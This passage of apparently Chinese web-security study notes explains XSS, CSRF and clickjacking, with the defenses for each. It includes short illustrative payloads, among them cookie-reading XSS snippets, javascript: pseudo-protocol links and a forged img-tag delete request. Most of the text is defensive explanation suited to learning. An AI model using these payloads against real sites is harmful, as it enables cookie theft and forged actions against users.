<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">window</span>.name = <span class="string">"alert(document.cookie)"</span>;</span></span><br><span class="line"><span class="javascript">  location.href = <span class="string">"http://www.xss.com"</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在同一个窗口打开XSS的站点后，只需要通过XSS执行代码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">window</span>.name);</span><br></pre></td></tr></table></figure>
<h3 id="Apache-Expect-Header-XSS"><a href="#Apache-Expect-Header-XSS" class="headerlink" title="Apache Expect Header XSS"></a>Apache Expect Header XSS</h3><p>向服务器提交</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Expect: &lt;script&gt;alert(&apos;xss&apos;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>当服务器出错返回时，Expect头的内容未经任何处理便会写入页面。对于XSS攻击来说，JavaScript工作在渲染后的浏览器环境中，无法控制用户浏览器发出的HTTP头。该漏洞当初被认为是一个鸡肋。</p>
<p>但是，使用Flash，可以自定义大多数请求的HTTP头。因此，Flash在新版本中禁止用户发送Expect头。但后来发现可以通过注入HTTP头的方式绕过这个限制，Flash目前已经修补了该问题。</p>
<p>此类攻击，还可以通过Java Applet等构造HTTP请求的第三方插件来实现。</p>
<h3 id="Anehta的回旋镖"><a href="#Anehta的回旋镖" class="headerlink" title="Anehta的回旋镖"></a>Anehta的回旋镖</h3><p>反射型XSS也可能像存储型XSS一样利用。</p>
<p>回旋镖的思路是：如果在B域上存在一个反射型“XSS_B”,在A域上存在一个存储型“XSS_A”,当用户访问A域上的“XSS_A”时，同时嵌入B域上的“XSS_B“，则可以达到在A域的XSS攻击B域用户的目的。</p>
<p>我们知道，在IE中，<code>&lt;iframe&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;link&gt;</code>等标签都会拦截”第三方Cookie“的发送。在Firefox则无这种限制（第三方Cookie指得是保存在本地的Cookie,也就是服务器设置了expire时间的Cookie）。</p>
<p>所以对于Firefox，只需要在XSS_A处嵌入一个iframe即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&quot;http://www.b.com/?xss...&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
<p>对于IE，为了达到执行XSS_B的目的，可以使用一个<code>&lt;form&gt;</code>标签，在浏览器提交form表单时，不会拦截第三方Cookie的发送。因此，先在XSS_A上写一个<code>&lt;form&gt;</code>,自动提交到XSS_B，然后在XSS_B中再跳转回原来的XSS_A,完成了一个”回旋镖“。这种攻击的缺点是，用户会看到地址栏的变化。</p>
<h3 id="Flash-XSS"><a href="#Flash-XSS" class="headerlink" title="Flash XSS"></a>Flash XSS</h3><p>在Flash中是可以嵌入ActionScript脚本的，</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">getURL(<span class="string">"javascript:alert(document.cookie)"</span>);</span><br></pre></td></tr></table></figure>
<p>使用<code>&lt;embed&gt;</code>将Flash嵌入页面中。</p>
<p>在实现XSS Filter时，一般会禁用<code>&lt;embed&gt;</code>、<code>&lt;object&gt;</code>等标签。后者甚至可以加载ActiveX控件。</p>
<p>如果网站一定要使用Flash,如果仅仅是视频文件，则要求其转码为”flv文件“。flv是静态文件，不会产出安全隐患。如果是带动态脚本的Flash，可以通过Flash的配置参数限制。</p>
<p>限制Flash动态脚本的最重要的参数是”allowScriptAccess“，这个参数定义了Flash能否与HTML页面进行通信。它有三个可选值：</p>
<p>1.always 不做任何限制</p>
<p>2.sameDomain 只允许来自于本域的Flash与Html通信，默认值</p>
<p>3.nerver 禁止</p>
<p>allowNetworking 也非常关键,它能控制Flash与外部网络进行通信</p>
<p>1.all 允许所有网络 默认值</p>
<p>2.internal 不能与浏览器通信如navigateToURL,但可以调用其他的API</p>
<p>3.none 禁止</p>
<p>除了用户上传的Flash文件能够实施脚本攻击外，一些Flash也可能会产生XSS漏洞。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">on (release) &#123;</span><br><span class="line">  getURL(_root.clickTAG, <span class="string">"_blank"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码缺乏输入验证，会被XSS攻击。</p>
<h2 id="XSS的防御"><a href="#XSS的防御" class="headerlink" title="XSS的防御"></a>XSS的防御</h2><h3 id="HttpOnly"><a href="#HttpOnly" class="headerlink" title="HttpOnly"></a>HttpOnly</h3><p>浏览器禁止页面的JavaScript访问带有HttpOnly属性的Cookie。它解决的是XSS后的Cookie劫持攻击。</p>
<p>HttpOnly是在服务器返回的响应头Set-Cookie上标记的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set-Cookie: &lt;name&gt;=&lt;value&gt;[; &lt;Max-Age&gt;=&lt;age&gt;]</span><br><span class="line">[; expires=&lt;date&gt;][; domain=&lt;domain_name&gt;]</span><br><span class="line">[; path=&lt;some_path&gt;][; secure][; HttpOnly]</span><br></pre></td></tr></table></figure>
<h3 id="输入检查"><a href="#输入检查" class="headerlink" title="输入检查"></a>输入检查</h3><p>XSS要求攻击者构造一些特殊字符，这些特殊字符可能是正常用户不会用到的，所以输入检查就有存在的必要了。</p>
<p>输入检查的逻辑，必须放在服务端代码中实现。如果只是在客户端使用JavaScript进行输入检查，很容易被攻击者绕过。目前的普遍做法是，同时在客户端和服务端实现相同的输入检查。客户端检查可以阻挡大部分误操作的用户，从而节省服务器资源。</p>
<p>XSS输入检查一般会检查用户输入的数据中是否包含一些特殊字符，如&lt;、&gt;、’、“等，将这些字符过滤或者编码。</p>
<p>比较智能的输入检查，可能会匹配XSS的特征。比如查找用户数据中是否包含了<code>&lt;script&gt;</code>、javascript等敏感字符。</p>
<p>这种输入检查的方式，称为XSS Filter。</p>
<p>XSS Filter只获取了用户提交的数据进行检查，但是并没有结合渲染页面的HTML代码，因此对语境的理解并不完整。</p>
<p>例如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$var"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>用户只需要提交一个恶意脚本所在的URL地址，即可实施XSS攻击。而大多数情况下，URL是合法的用户数据。</p>
<p>XSS Filter还有一个问题，对&lt;、&gt;的处理可能会改变用户语义。</p>
<p>比如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1+1&lt;3</span><br></pre></td></tr></table></figure>
<p>如果XSS Filter不够智能，粗暴地过滤或者替换&lt;，则会改变用户原来的意思。</p>
<h3 id="输出检查"><a href="#输出检查" class="headerlink" title="输出检查"></a>输出检查</h3><p>既然输入检查存在这么多问题，那输出检查又如何呢?</p>
<p>一般来说，除了富文本输出外，在变量输出到HTML页面时，可以使用编码或转义的方式来防御XSS攻击。</p>
<h4 id="安全的编码函数"><a href="#安全的编码函数" class="headerlink" title="安全的编码函数"></a>安全的编码函数</h4><p>编码分为很多种，针对HTML代码的编码方式是HtmlEncode。<br>HtmlEncode并非专有名词，它只是一种函数实现。它的作用是将字符转换成HTMLEntities,对应的标准是ISO-8859-1</p>
<p>为了对抗XSS,在HTMLEncode中要求至少转换以下字符：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp; -&gt; &amp;amp;</span><br><span class="line">&lt; -&gt; &amp;lt;</span><br><span class="line">&gt; -&gt; &amp;gt;</span><br><span class="line">&quot; -&gt; &amp;quot;</span><br><span class="line">&apos; -&gt; &amp;#x27;</span><br><span class="line">/ -&gt; &amp;#x2F</span><br></pre></td></tr></table></figure>
<p>Javascript的编码方式可以使用JavaScriptEncode</p>
<p>它使用”\”对特殊字符进行转义。在对抗XSS时还要求输出的变量必须在引号内部，以避免造成安全问题。</p>
<p>比较两种写法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = escapeJavaScript($evil);</span><br><span class="line"><span class="keyword">var</span> y = <span class="string">'"'</span>+escapeJavaScript($evil)+<span class="string">'"'</span>;</span><br></pre></td></tr></table></figure>
<p>如果只是转义了几个危险字符，如’、”、&lt;、&gt;、\、&amp;、#等，那么可能会输出</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>;alert(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> y = <span class="string">"1;alert(2);"</span>;</span><br></pre></td></tr></table></figure>
<p>攻击者即使想要逃脱出引号的范围，也会遇到困难。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> y = <span class="string">"\";alert(1);\/\/"</span>;</span><br></pre></td></tr></table></figure>
<p>但是开发者没有这个习惯怎么办？</p>
<p>那就只能使用一个更加严格的JavaScriptEncode函数来保证安全了——除了数字、字母外的所有字符，都使用十六进制“\xHH”的方式进行编码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>;alert(<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
<p>变成了</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>\x3balert\x282\x29;</span><br></pre></td></tr></table></figure>
<p>此外还有其他编码函数，如XMLEncode、JSONEncode等</p>
<h4 id="只需要一种编码吗"><a href="#只需要一种编码吗" class="headerlink" title="只需要一种编码吗"></a>只需要一种编码吗</h4><p>XSS主要发生在MVC架构中的View层。大部分的XSS漏洞可以在模板系统中解决。</p>
<p>如Python的开发框架Django自带的模板系统”Django Templates”，可以使用escape进行HtmlEncode,并且在Django1.0中得到了加强——默认所有的变量都会被escape。</p>
<p>但这样还是不能完全避免XSS问题，需要“在正确的地方使用正确的编码方式”</p>
<p>例如</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">"alert('$var');"</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果用户输入</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">var</span> = htmlencode(<span class="string">"');alert('2"</span>);</span><br></pre></td></tr></table></figure>
<p>对于浏览去器来说，htmlparser会优先于JavaScript Parser执行</p>
<p>经过解析后，结果为</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">"alert('');alert('2');"</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>xss被注入。</p>
<p>xss发出的原因是，没有分清楚输出变量的语境，并非在模板引擎中使用了auto-escape就万事大吉了。</p>
<h3 id="正确防御XSS"><a href="#正确防御XSS" class="headerlink" title="正确防御XSS"></a>正确防御XSS</h3><p>XSS的本质是一种“HTML注入”，想要根治XSS问题，可以列出所有XSS可能发生的场景，再一一解决。</p>
<h4 id="在HTML标签中输出"><a href="#在HTML标签中输出" class="headerlink" title="在HTML标签中输出"></a>在HTML标签中输出</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>$var<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> &gt;</span>$var<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>防御的方法是对变量使用HtmlEncode</p>
<h4 id="在HTML属性中输出"><a href="#在HTML属性中输出" class="headerlink" title="在HTML属性中输出"></a>在HTML属性中输出</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"abc"</span> <span class="attr">name</span>=<span class="string">"$var"</span> &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>防御的方法是对变量也是使用HtmlEncode</p>
<h4 id="在script标签中输出"><a href="#在script标签中输出" class="headerlink" title="在script标签中输出"></a>在script标签中输出</h4><p>首先应该确保输出的变量在引号中：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> x = <span class="string">"$var"</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>防御时使用JavaScriptEncode</p>
<h4 id="在事件中输出"><a href="#在事件中输出" class="headerlink" title="在事件中输出"></a>在事件中输出</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">"funcA('$var')"</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>防御方式和在script标签中输出类似</p>
<h4 id="在CSS中输出"><a href="#在CSS中输出" class="headerlink" title="在CSS中输出"></a>在CSS中输出</h4><p>比如@import、url等直接加载XSS、expression(alert(‘xss’))等</p>
<p>一方面需尽可能避免用户可控制的变量在css中输出，如果必须有这样的需求，那么使用encodeForCSS</p>
<h4 id="在地址栏输出"><a href="#在地址栏输出" class="headerlink" title="在地址栏输出"></a>在地址栏输出</h4><p>一般来说使用URLEncode即可，但是如果整个URL被用户完全控制，Protocal和Host是不能使用URLEncode的，否则会改变URL的语义。</p>
<p><code>[Protocal][Host][Path][Search][Hash]</code></p>
<p>例如<a href="https://www.evil.com/a/b/c/test?abc=123#ssss" target="_blank" rel="noopener">https://www.evil.com/a/b/c/test?abc=123#ssss</a></p>
<p>对于如下的输出方式：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"$var"</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>攻击者可能会构造伪协议实施攻击</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(1);"</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>此外，“vbscript”、“dataURI”等伪协议也可以导致脚本执行。</p>
<p>一般来说，对于用户控制整个URL，应该先检查是否以“http”开头，如果不是则自动添加，以保证不会出现伪协议类的XSS攻击，然后再对变量进行URLEncode。</p>
<h3 id="处理富文本"><a href="#处理富文本" class="headerlink" title="处理富文本"></a>处理富文本</h3><p>网站允许用户提交一些自定义的HTML代码，称之为富文本。</p>
<p>在处理富文本时，还是要回到“输入检查”的思路上来。“输入检查”的主要问题是检查时还不知道变量的输出语境。但富文本数据，其语义是完整的HTML,在输出时也不会拼凑到某个标签的属性中。因此，可以特殊对待。</p>
<p>通过htmlparser可以解析出HTML代码的标签、标签属性和事件。</p>
<p>在过滤富文本时，事件应该被严格禁止、而一些危险的标签，比如iframe、script、base、form等也是应该严格禁止的。在标签选择上，应该使用白名单。比如，只允许a、img、div等比较安全的标签。“白名单”同样应该用于属性和事件的选择。</p>
<p>在富文本过滤中，处理CSS也是一件麻烦的事，因此应该禁止用户自定义CSS和style。如果不能禁止，那就需要一个CSS Parser对样式进行智能分析，检查其中是否包含危险代码。</p>
<h3 id="防御DOM-Based-XSS"><a href="#防御DOM-Based-XSS" class="headerlink" title="防御DOM Based XSS"></a>防御DOM Based XSS</h3><p>DOM Based XSS前文提到的几种防御方法都不太适用。</p>
<p>DOM Based XSS是从JavaScript中输出数据到HTML页面里，而前文都是针对从服务器应用直接输出到HTML页面的XSS漏洞。</p>
<p>服务器执行了javascriptEscape，输出的数据又重新渲染到了页面中，对变量进行了解码，仍然会产生XSS。</p>
<p>正确的防御方法是，在$var输出到script时，执行一次javaScriptEncode，其次在输出到HTML页面时，如果输出到事件或者脚本，则要再做一次javaScriptEncode；如果输出到HTML内容或者属性，则再做一次HtmlEncode。</p>
<p>触发DOM Based XSS的地方有很多，以下几个地方是JavaScript输出到HTML页面的必经之路。</p>
<p>document.write()</p>
<p>document.writeln()</p>
<p>xxx.innerHTML=</p>
<p>xxx.outerHTML=</p>
<p>innerHTML.replace</p>
<p>document.attachEvent()</p>
<p>window.attachEvent()</p>
<p>document.location.replace()</p>
<p>document.location.assign()</p>
<p>…</p>
<p>需要重点关注这几个地方的参数是否可以被用户控制</p>
<p>除了服务器端直接输出变量到JavaScript外，还有以下几个地方可能成为DOM Based XSS的输出点，也需要重点关注。</p>
<p>inputs框</p>
<p>window.location(href、hash等)</p>
<p>window.name</p>
<p>document.referrer</p>
<p>document.cookie</p>
<p>localstorage</p>
<p>XMLHttpRequest返回的数据</p>
<p>…</p>
<h3 id="换个角度看XSS的风险"><a href="#换个角度看XSS的风险" class="headerlink" title="换个角度看XSS的风险"></a>换个角度看XSS的风险</h3><p>前面都是从漏洞的形成原理上看的，如果从业务风险角度看则有不同的观点</p>
<p>一般来说，存储型XSSS的风险高于反射型。因为它保存在服务器上，有可能会跨页面存在。它不会改变页面URL的原有结构，因此有时候还能逃过一些IDS的检测。</p>
<p>从攻击过程来说，反射型XSS，一般要求攻击者诱使用户点击一个包含XSS代码的URL链接；而存储型XSS,则只需要让用户查看一个正常的URL链接。</p>
<p>从风险角度看，用户之间有互动的页面，是可能发起XSS Worm攻击的地方。而根据不同页面的PageView高低，也可以分析出哪些页面受XSS攻击后的影响更大。</p>
<p>在修补漏洞时遇到的最大挑战之一是漏洞数量太多，开发者不太来得及立刻修复所有漏洞。从业务风险角度来重新定位每个XSS漏洞，就具有了重要意义。</p>
<h1 id="跨站点请求伪造-CSRF"><a href="#跨站点请求伪造-CSRF" class="headerlink" title="跨站点请求伪造(CSRF)"></a>跨站点请求伪造(CSRF)</h1><p>CSRF（Cross Site Request Forgery），跨站点请求伪造。</p>
<h2 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h2><p>攻击者首先在自己的域构造一个页面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://www.a.com/csrf.html</span><br></pre></td></tr></table></figure>
<p>其内容为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;http://blog.com/article?m=delete&amp;id=1&quot; /&gt;</span><br></pre></td></tr></table></figure>
<p>攻击者诱使目标用户（博主），访问这个页面，id=1的一篇博客文章就被删除了。</p>
<p>这里攻击者以该用户身份（本质上是发送了Cookie）在第三方站点里发送了请求，这个请求是攻击者伪造的，所以叫”跨站点请求伪造”。</p>
<h2 id="浏览器的Cookie策略"><a href="#浏览器的Cookie策略" class="headerlink" title="浏览器的Cookie策略"></a>浏览器的Cookie策略</h2><p>浏览器所持有的Cookie分为两种：</p>
<p>一种是”Session Cookie”,又称”临时Cookie”;另一种是”Third-party Cookie”,也称为”本地Cookie”。Third-party Cookie服务器指定了Expire时间，会保存在本地。Session Cookie没有指定Expire时间，保存在浏览器进程的内存空间中，新打开的Tab页也是有效的，但浏览器关闭后就失效了。</p>
<p>一个域加载另一个域的资源（比如使用img、iframe、script、link等标签），由于安全原因，许多浏览器会阻止Third-party Cookie的发送，只能发送Session Cookie。而某些浏览器不会阻止，前面删除文章的例子就是在不会阻止Third-party Cookie发送的浏览器中实现的。</p>
<h2 id="P3P头的副作用"><a href="#P3P头的副作用" class="headerlink" title="P3P头的副作用"></a>P3P头的副作用</h2><p>浏览器拦截第三方Cookie发送，在某种程度上降低了CSRF攻击的威力。</p>
<p>但是P3P Header会是问题复杂起来，它是W3C制定的一项关于隐私的标准，如果网站返回给浏览器的HTTP头中包含有P3P头，将允许浏览器发送第三方Cookie。它主要用于需要跨域访问页面的场景，如父页面b嵌入了iframe，iframe的src指向的a页面网址，a页面响应头有Set-Cookie。一般情况下由于跨域，在a.com上Set-Cookie是不会成功的，但是加入P3P头后，可以跨域Set-Cookie成功，浏览器也不会再拦截第三方Cookie的发送。P3P头只需要由网站设置一次即可，之后每次请求都会遵循此策略。</p>
<h2 id="只有GET请求可以吗"><a href="#只有GET请求可以吗" class="headerlink" title="只有GET请求可以吗?"></a>只有GET请求可以吗?</h2><p>对于攻击者来说，有许多方法构造POST请求。</p>
<p>1.form表单</p>
<p>在页面中构造一个form表单，使用JavaScript自动提交这个表单。</p>
<p>2.Flash</p>
<p>Flash有多种方式能够发送网络请求，包括POST请求，如使用URLRequest、getURL、loadVars等。</p>
<h2 id="CSRF-Worm"><a href="#CSRF-Worm" class="headerlink" title="CSRF Worm"></a>CSRF Worm</h2><p>2008年9月，国内安全组织80sec公布了一个百度的CSRF Worm。</p>
<p>它主要利用了两个接口：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://msg.baidu.com/?...sn=用户账户&amp;co=消息内容...</span><br></pre></td></tr></table></figure>
<p>修改参数sn，可以对指定用户发送短消息。</p>
<p>而另一个接口能查询出某个用户的所有好友</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://frd.baidu.com/?...un=用户账户...</span><br></pre></td></tr></table></figure>
<p>两者相结合，先让一个百度用户查看恶意页面后，给他所有好友发送一条短消息，消息中又包含一个恶意页面，使得好友将消息发送给他们的好友，就形成了一个CSRF Worm。</p>
<h2 id="CSRF的防御"><a href="#CSRF的防御" class="headerlink" title="CSRF的防御"></a>CSRF的防御</h2><h3 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h3><p>验证码可以强制用户与应用进行交互，只有在用户知情的情况下才会发送请求。但是，出于用户体验考虑，不能给所有接口都加上验证码，所以只能作为一种辅助的防御手段。</p>
<h3 id="Referer-Check"><a href="#Referer-Check" class="headerlink" title="Referer Check"></a>Referer Check</h3><p>Referer的值一般是请求所在的页面，Referer Check可以被用于检查请求是否来自合法的”源“。</p>
<p>但是，服务器并非任何时候都可以取到Referer，很多用户处于隐私保护限制了Referer的发送。从Https跳转到http出于安全的考虑，浏览器也不会发送Referer。Flash一些低版本也可以伪造Referer。</p>
<p>所以不能依赖Referer来防御，但作为监控CSRF攻击的发生，倒是一种可行的方法。</p>
<h3 id="Anti-CSRF-Token"><a href="#Anti-CSRF-Token" class="headerlink" title="Anti CSRF Token"></a>Anti CSRF Token</h3><p>这是业内的常用做法。</p>
<p>CSRF的本质是重要操作的所有参数都是可以被攻击者猜测到的。</p>
<p>我们在参数上增加一个参数Token，这个Token是随机的，Token可以放在用户的Session中，或者浏览器的Cookie中，在提交请求时，服务器需要验证请求的Token和用户的Session（或Cookie）是否一致，如果一致，则请求是合法的。</p>
<p>这是“不可预测性原则”的一种应用。</p>
<h4 id="Token的使用原则"><a href="#Token的使用原则" class="headerlink" title="Token的使用原则"></a>Token的使用原则</h4><p>1.Token的生成一定要足够随机。</p>
<p>2.可以允许在一个用户的有效生命周期内，使用同一个Token。但如果是下个周期，则应该生成新的Token（如表单已提交）。</p>
<p>3.为了处理多个页面共存Token失效的问题，可以考虑生成多个有效的Token。</p>
<p>4.要注意Token的保密性，可以把Token放在表单内部，而非url上，把敏感操作由GET改为POST，避免Token泄漏。当然如果网站存在XSS漏洞，Token也会泄漏，所以安全防御的体系是相辅相成的。</p>
<h1 id="点击劫持（ClickJacking）"><a href="#点击劫持（ClickJacking）" class="headerlink" title="点击劫持（ClickJacking）"></a>点击劫持（ClickJacking）</h1><h2 id="什么是点击劫持"><a href="#什么是点击劫持" class="headerlink" title="什么是点击劫持"></a>什么是点击劫持</h2><p>点击劫持是一种视觉上的欺骗手段。攻击者一般使用一个透明的、不可见的iframe，覆盖在一个网页上，然后诱使用户在不知情的情况下点击透明的iframe页面。通过调整iframe页面的位置，可以诱使用户恰好点击iframe页面的一些功能性按钮上。</p>
<p>通过控制iframe的长、宽，以及调整top、left位置，可以把iframe页面内任意部分覆盖到任何地方。同时设置iframe的position为absolute，并将z-index的值设置为最大，以达到让iframe处于页面的最上层。最后，再通过设置opacity来控制iframe页面的透明程度，值为0是完全不可见。</p>
<p>在CSRF攻击中，如果出现用户需要交互的页面，攻击可能无法完成。但是，点击劫持没有这个问题，因为它利用的就是与用户产生交互的页面。</p>
<h2 id="Flash点击劫持"><a href="#Flash点击劫持" class="headerlink" title="Flash点击劫持"></a>Flash点击劫持</h2><p>曾经有一个ClickJacking攻击案例，攻击者可以通过Flash构造了点击劫持，在完成一系列复杂的动作后，最终控制了用户电脑的摄像头。</p>
<p>攻击者制作了一个Flash游戏，这个游戏就是让用户去点击“CLICK”按钮，每次点击后这个按钮的位置都会发生变化。在Flash上面隐藏了一个看不见的iframe，攻击通过诱导用户鼠标点击就能完成较复杂的动作。</p>
<h2 id="图片覆盖攻击"><a href="#图片覆盖攻击" class="headerlink" title="图片覆盖攻击"></a>图片覆盖攻击</h2><p>图片覆盖也可以起到类似的点击劫持的作用。（XSIO，Cross Site Image Overlaying）</p>
<p>通过调整图片的style可以使图片覆盖的任意指定位置。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">style</span>=<span class="string">"position: absolute; right: 320px; top: 90px"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果应用没有限制style的position为absolute的话，图片可以覆盖到页面上的任意位置。</p>
<p>用户点击图片，如果链接到一个钓鱼网站，用户可能就上当了。</p>
<p>图片还可以伪装得像一个正常的链接、按钮；或者在图片中构造一些文字，覆盖在关键的位置，就有可能完全改变页面中想表达的意思。这种情况下，不需要用户点击，也能达到欺骗的目的。比如，修改图片中的联系电话。</p>
<p>由于img标签在很多站点都是对用户开放的，在防御XSIO时，需要检查用户提交的HTML代码中，img标签的style属性是否可能导致浮出。</p>
<h2 id="拖拽劫持与数据窃取"><a href="#拖拽劫持与数据窃取" class="headerlink" title="拖拽劫持与数据窃取"></a>拖拽劫持与数据窃取</h2><p>目前很多浏览器都支持Drag &amp; Drop的API。浏览器中的拖拽对象可以是一个链接，也可以是一段文字，还可以从一个窗口拖拽到另一个窗口，因此拖拽是不受同源策略限制的。</p>
<p>拖拽劫持的思路是诱使用户从隐藏的不可见iframe中拖拽出攻击者希望得到的数据，然后放到攻击者能控制的另外一个页面中，从而窃取数据。</p>
<h2 id="ClickJacking3-0：触屏劫持"><a href="#ClickJacking3-0：触屏劫持" class="headerlink" title="ClickJacking3.0：触屏劫持"></a>ClickJacking3.0：触屏劫持</h2><p>安全研究者称其为TapJacking。</p>
<p>从手机OS的角度来看，触屏实际上就是一个事件，手机OS捕捉这些事件，并执行相应的动作。</p>
<p>常见的几个事件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">touchstart: 手指触摸屏幕时发生</span><br><span class="line">touchend: 手指离开屏幕时发生</span><br><span class="line">touchmove: 手指滑动时发生</span><br><span class="line">touchcancel: 系统可取消touch事件</span><br></pre></td></tr></table></figure>
<p>将一个不可见的iframe覆盖到当前网页上，就可以劫持用户的触屏操作。</p>
<p>针对视觉效果的攻击可以被利用进行钓鱼和欺诈。</p>
<h2 id="防御ClickJacking"><a href="#防御ClickJacking" class="headerlink" title="防御ClickJacking"></a>防御ClickJacking</h2><p>针对传统的ClickJacking，一般是通过禁止跨域的iframe来防范。</p>
<h3 id="frame-busting"><a href="#frame-busting" class="headerlink" title="frame busting"></a>frame busting</h3><p>通过可以写一段JavaScript代码，以禁止iframe的嵌套。这种方法叫作frame busting。比如</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (top.location != location) &#123;</span><br><span class="line">  top.location = self.location;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当然，还要很多很多frame busting的写法，这里就不一一罗列了。</p>
<p>frame busting有一些缺陷，由于它是用JavaScript写的，控制能力并不是特别强，因此有很多方法可以绕过它。此外像HTML5的sandbox属性、IE中iframe的security属性等，都可以限制iframe页面中的JavaScript脚本执行，从而使frame busting失效。</p>
<h3 id="X-Frame-Options"><a href="#X-Frame-Options" class="headerlink" title="X-Frame-Options"></a>X-Frame-Options</h3><p>X-Frame-Options可以说是为了解决ClickJacking而生的，它有三个可选的值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DENY 拒绝当前页面加载任何frame页面</span><br><span class="line">SAMEORIGIN frame页面的地址只能为同源域名下的页面</span><br><span class="line">ALLOW-FROM origin 定义允许frame加载的页面地址</span><br></pre></td></tr></table></figure>
<p>除了X-Frame-Options之外，Firefox的“Content Security Policy”以及Firefox的NoScript扩展也能有效防御ClickJacking。这些方案为我们提供了更多的选择。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>ClickJacking主要被利用在钓鱼、欺诈和广告作弊等方面。相对于XSS与CSRF来说，因为需要诱导用户与页面产生交互行为，因此实施攻击的成本更高，在网络犯罪中比较少见。</p>
<h1 id="HTML5安全"><a href="#HTML5安全" class="headerlink" title="HTML5安全"></a>HTML5安全</h1><p>HTML5带来了新的功能，也带来了新的安全挑战。</p>
